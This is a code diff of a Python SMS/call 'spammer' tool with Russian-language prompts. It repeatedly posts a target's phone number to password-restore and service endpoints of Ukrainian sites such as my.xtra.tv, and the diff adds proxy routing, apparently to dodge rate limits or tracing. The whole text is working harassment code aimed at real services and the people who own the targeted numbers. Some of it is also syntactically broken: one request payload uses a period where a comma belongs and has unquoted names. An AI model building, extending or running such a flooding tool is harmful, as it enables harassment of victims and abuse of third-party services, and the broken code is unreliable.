@@ -51,7 +51,7 @@ else:
 run = int(console.input('[green]Введите количество повторов (1-10):\n[blue]spammer>> '))
 for _ in track(range(run)):
  try:
-     requests.post('https://my.xtra.tv/api/password/restore?lang=uk', data={'phone': "+" + number}, headers=headers)
+     requests.post('https://my.xtra.tv/api/password/restore?lang=uk', data={'phone': "+" + number}, headers=headers, proxies=proxies)
      print('xtra.tv-pass')
  except:
      print('Не доставлено (xtra.tv-pass)')
@@ -81,7 +81,7 @@ for _ in track(range(run)):
  except:
          print('Не отправлено (zolotakoroleva.ua)')
  try:
-     requests.post('https://my.xtra.tv/api/service?lang=uk', data={'phone': "+" + number. "first_name": Настя, "surname": Сосикиная}, headers=headers)
+     requests.post('https://my.xtra.tv/api/service?lang=uk', data={'phone': "+" + number. "first_name": Настя, "surname": Сосикиная}, headers=headers, proxies=proxies)
      print('xtra.tv-service')
  except:
      print('Не доставлено (xtra.tv-service)')
